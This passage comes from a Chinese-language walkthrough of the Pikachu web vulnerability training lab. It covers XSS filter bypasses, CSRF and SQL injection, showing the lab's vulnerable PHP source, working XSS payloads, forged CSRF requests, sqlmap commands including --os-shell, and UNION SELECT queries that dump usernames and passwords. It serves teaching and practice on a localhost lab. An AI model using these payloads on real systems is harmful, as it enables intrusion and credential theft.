class="token string double-quoted-string">"content"</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$content</span><span class="token operator">=</span><span class="token function">escape</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$name</span><span class="token operator">=</span><span class="token function">escape</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$time</span><span class="token operator">=</span><span class="token variable">$time</span><span class="token operator">=</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Y-m-d g:i:s'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//插入数据到数据库</span>    <span class="token variable">$query</span><span class="token operator">=</span><span class="token string double-quoted-string">"insert into xssblind(time,content,name) values('<span class="token interpolation"><span class="token variable">$time</span></span>','<span class="token interpolation"><span class="token variable">$content</span></span>','<span class="token interpolation"><span class="token variable">$name</span></span>')"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysqli_affected_rows</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$html</span><span class="token operator">.=</span><span class="token string double-quoted-string">"&lt;p>谢谢参与，阁下的看法我们已经收到!&lt;/p>"</span><span class="token punctuation">;</span><span class="token operator">...</span><span class="token comment">//读取数据</span>    <span class="token variable">$query</span><span class="token operator">=</span><span class="token string double-quoted-string">"select * from xssblind"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token operator">=</span><span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$html</span><span class="token operator">=</span><span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span><span class="token constant">A</span><span class="token operator">&lt;</span>tr<span class="token operator">></span>    <span class="token operator">&lt;</span>td<span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>td<span class="token operator">></span>    <span class="token operator">&lt;</span>td<span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'time'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>td<span class="token operator">></span>    <span class="token operator">&lt;</span>td<span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>td<span class="token operator">></span>    <span class="token operator">&lt;</span>td<span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>td<span class="token operator">></span>    <span class="token operator">&lt;</span>td<span class="token operator">></span><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string double-quoted-string">"admin.php?id=<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>"</span><span class="token operator">></span>删除<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>td<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>tr<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同样也是不做任何处理存储数据，读取数据的时候也是没有做任何处理</p><h3 id="xss之过滤"><a href="#xss之过滤" class="headerlink" title="xss之过滤"></a>xss之过滤</h3><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;ScRipt&gt;alert(1)&lt;&#x2F;sCriPt&gt;&lt;img src&#x3D;x onerror&#x3D;alert(1)&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>源码</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//这里会使用正则对&lt;script进行替换为空,也就是过滤掉</span><span class="token variable">$message</span><span class="token operator">=</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>过滤了&lt;script，但是过滤的不够彻底，利用大小写变换或其他标签可以成功执行</p><h3 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h3><p><a href="https://www.php.net/manual/zh/function.htmlspecialchars.php">htmlspecialchars</a> — 将特殊字符转换为 HTML 实体</p><table><thead><tr><th align="left">字符</th><th align="left">替换后</th></tr></thead><tbody><tr><td align="left"><code>&amp;</code> (&amp; 符号)</td><td align="left"><code>&amp;</code></td></tr><tr><td align="left"><code>&quot;</code> (双引号)</td><td align="left"><code>&quot;</code>，除非设置了 <strong><code>ENT_NOQUOTES</code></strong></td></tr><tr><td align="left"><code>&#39;</code> (单引号)</td><td align="left">设置了 <strong><code>ENT_QUOTES</code></strong> 后， <code>&#39;</code> (如果是 <strong><code>ENT_HTML401</code></strong>) ，或者 <code>&#39;</code> (如果是 **<code>ENT_XML1</code>**、 <strong><code>ENT_XHTML</code></strong> 或 <strong><code>ENT_HTML5</code></strong>)。</td></tr><tr><td align="left"><code>&lt;</code> (小于)</td><td align="left"><code>&lt;</code></td></tr><tr><td align="left"><code>&gt;</code> (大于)</td><td align="left"><code>&gt;</code></td></tr></tbody></table><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&#39; onclick&#x3D;alert(1) &#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>源码</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$message</span><span class="token operator">=</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$html1</span><span class="token operator">.=</span><span class="token string double-quoted-string">"&lt;p class='notice'>你的输入已经被记录:&lt;/p>"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在无法使用一些标签中所需的字符时，利用闭合的方式尝试进行xss攻击，如果设置了ENT_QUOTES，就无法进行xss攻击了</p><h3 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h3><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">javascript:alert(1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用<code>javascript</code>伪协议执行js代码</p><p><strong>源码</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$html</span><span class="token operator">.=</span><span class="token string double-quoted-string">"&lt;p class='notice'>叫你输入个url,你咋不听?&lt;/p>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'www.baidu.com'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$html</span><span class="token operator">.=</span><span class="token string double-quoted-string">"&lt;p class='notice'>我靠,我真想不到你是这样的一个人&lt;/p>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//输出在a标签的href属性里面,可以使用javascript协议来执行js</span>    <span class="token comment">//防御:只允许http,https,其次在进行htmlspecialchars处理</span>    <span class="token variable">$message</span><span class="token operator">=</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENT_QUOTES</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$html</span><span class="token operator">.=</span><span class="token string double-quoted-string">"&lt;a href='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$message</span><span class="token punctuation">&#125;</span></span>'> 阁下自己输入的url还请自己点一下吧&lt;/a>"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h3><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;&#x2F;script&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>源码</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//这里讲输入动态的生成到了js中,形成xss//javascript里面是不会对tag和字符实体进行解释的,所以需要进行js转义//讲这个例子主要是为了让你明白,输出点在js中的xss问题,应该怎么修?//这里如果进行html的实体编码,虽然可以解决XSS的问题,但是实体编码后的内容,在JS里面不会进行翻译,这样会导致前端的功能无法使用。//所以在JS的输出点应该使用\对特殊字符进行转义if(isset($_GET['submit']) &amp;&amp; $_GET['message'] !=null)&#123;    $jsvar=$_GET['message'];//    $jsvar=htmlspecialchars($_GET['message'],ENT_QUOTES);    if($jsvar == 'tmac')&#123;        $html.="<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>&#123;$PIKA_ROOT_DIR&#125;assets/images/nbaplayer/tmac.jpeg<span class="token punctuation">'</span></span> <span class="token punctuation">/></span></span>";...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>xssr_title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>which NBA player do you like?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>xssr_in<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>xssr_submit<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fromjs<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>  <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$html</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h3><p>Cross-site request forgery  简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。                         很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。</p><h3 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h3><pre class="line-numbers language-url" data-language="url"><code class="language-url">http:&#x2F;&#x2F;localhost&#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;girl&amp;phonenum&#x3D;12344556789&amp;add&#x3D;qwe&amp;email&#x3D;12344556789@qq.com&amp;submit&#x3D;submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>让kobe用户去点击上面的连接，kobe用户原本的信息</p><p><img src="https://img1.imgtp.com/2022/04/08/624fd3a77b183.png"></p><p>在点击完连接后可以看到kobe的个人信息被修改为lucy的了</p><p><img src="https://img1.imgtp.com/2022/04/08/624fd420b437b.png"></p><p><img src="https://img1.imgtp.com/2022/04/08/624fd45118bd6.png"></p><h3 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h3><p>利用burp生成csrf poc</p><p><img src="https://img1.imgtp.com/2022/04/08/624fd5d605c8b.png"></p><p>可以copy下来生成的poc，再让受害者点击存放poc的网址</p><p><img src="https://img1.imgtp.com/2022/04/08/624fd6c3afcc6.png"></p><p><img src="https://img1.imgtp.com/2022/04/08/624fd6c42bdda.png"></p><p>kobe的个人信息再一次被修改为lucy的</p><h3 id="CSRF-token"><a href="#CSRF-token" class="headerlink" title="CSRF(token)"></a>CSRF(token)</h3><p>跟前面比较，这里多了一个Token，如果后台对提交的Token进行了验证，由于Token是随机的，我们就无法伪造URL了</p><p><strong>源码</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sex'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token constant">null</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phonenum'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token constant">null</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'add'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token constant">null</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token constant">null</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">//判断服务端的token和客户端的token是否一致</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="SQL-Inject"><a href="#SQL-Inject" class="headerlink" title="SQL-Inject"></a>SQL-Inject</h2><h3 id="概述-3"><a href="#概述-3" class="headerlink" title="概述"></a>概述</h3><p>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。</p><p>在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：<br>1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；<br>2.使用参数化（Parameterized Query 或 Parameterized Statement）；<br>3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了”拼接”的方式,所以使用时需要慎重!                    </p><h3 id="数字型注入-post"><a href="#数字型注入-post" class="headerlink" title="数字型注入(post)"></a>数字型注入(post)</h3><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a><strong>源码</strong></h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//这里没有做任何处理，直接拼到select里面去了,形成Sql注入</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$query</span><span class="token operator">=</span><span class="token string double-quoted-string">"select username,email from member where id=<span class="token interpolation"><span class="token variable">$id</span></span>"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这里如果用==1,会严格一点</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>利用sqlmap，我们在测试的时候可以省去很多不必要的麻烦，但是工具并不是万能的，只是用来辅助我们去做测试</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ sqlmap -u <span class="token string">"http://localhost/pikachu/vul/sqli/sqli_id.php"</span> --batch --forms//检测get型和post型注入$ sqlmap -u <span class="token string">"http://localhost/pikachu/vul/sqli/sqli_id.php"</span> --batch --forms --dbs//查看数据库$ sqlmap -u <span class="token string">"http://localhost/pikachu/vul/sqli/sqli_id.php"</span> --batch --forms --os-shell//获取shell（必须知道网站绝对路径）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h4><p>利用hackbar插件（这里最好使用chrome中的插件），在发送post请求的id中加上’，网页返回报错信息，判断存在sql注入</p><p><img src="https://img1.imgtp.com/2022/04/08/624fdcd6cf7f4.png"></p><p>根据回显信息，判断为数字型注入，构造闭合，插入<code>order by</code>语句来判断字段数，在字段数为3的时候报错，说明字段数为2</p><p><img src="https://img1.imgtp.com/2022/04/08/624fdddfe7879.png"></p><p>判断回显点，用联合查询语句，union select，记住<code>id=</code>的数必须是一个错误的数，这样数据库执行后面联合查询语句的信息才能回显在页面上</p><p><img src="https://img1.imgtp.com/2022/04/08/624fdebb7efc7.png"></p><p>之后我们就可以插入一些函数或sql语句来查询数据库了</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token comment">//查询当前数据库名称</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token comment">//查询当前数据库版本</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token comment">//查询当前数据库登录用户</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token comment">//查询当前数据库表的信息</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token comment">//查询users表的列</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token comment">//查询表中的账号和密码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img1.imgtp.com/2022/04/08/624fe1e816713.png"></p><h3 id="字符型注入-get"><a href="#字符型注入-get" class="headerlink" title="字符型注入(get)"></a>字符型注入(get)</h3><h4 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a><strong>源码</strong></h4><p>这里修改了请求方式，和注入类型</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$name</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//这里的变量是字符型，需要考虑闭合</span><span class="token variable">$query</span><span class="token operator">=</span><span class="token string double-quoted-string">"select id,email from member where username='<span class="token interpolation"><span class="token variable">$name</span></span>'"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="sqlmap-1"><a href="#sqlmap-1" class="headerlink" title="sqlmap"></a>sqlmap</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2"</span> --batch//检测是否存在注入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="手工注入-1"><a href="#手工注入-1" class="headerlink" title="手工注入"></a>手工注入</h4><p>判断注入类型</p><p><img src="https://img1.imgtp.com/2022/04/08/624fe73a8800e.png"></p><p>在url中直接添加sql语句</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">name<span class="token operator">=</span><span class="token number">1</span><span class="token string">'%23//语句闭合name=1'</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">2</span><span class="token operator">%</span><span class="token number">23</span><span class="token comment">//判断字段数</span>name<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,2%23//联合查询注入name=-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token comment">//查询当前数据库</span>name<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database())%23//查询当前数据库表的信息name=-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token comment">//查询当前表字段信息</span>name<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token comment">//查询账号密码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img1.imgtp.com/2022/04/08/624fe973d9e74.png"></p><h3 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h3><h4 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a><strong>源码</strong></h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//这里没有做任何处理，直接拼到select里面去了</span><span class="token variable">$name</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//这里的变量是模糊匹配，需要考虑闭合</span><span class="token variable">$query</span><span class="token operator">=</span><span class="token string double-quoted-string">"select username,id,email from member where username like '%<span class="token interpolation"><span class="token variable">$name</span></span>%'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="sqlmap-2"><a href="#sqlmap-2" class="headerlink" title="sqlmap"></a>sqlmap</h4><pre 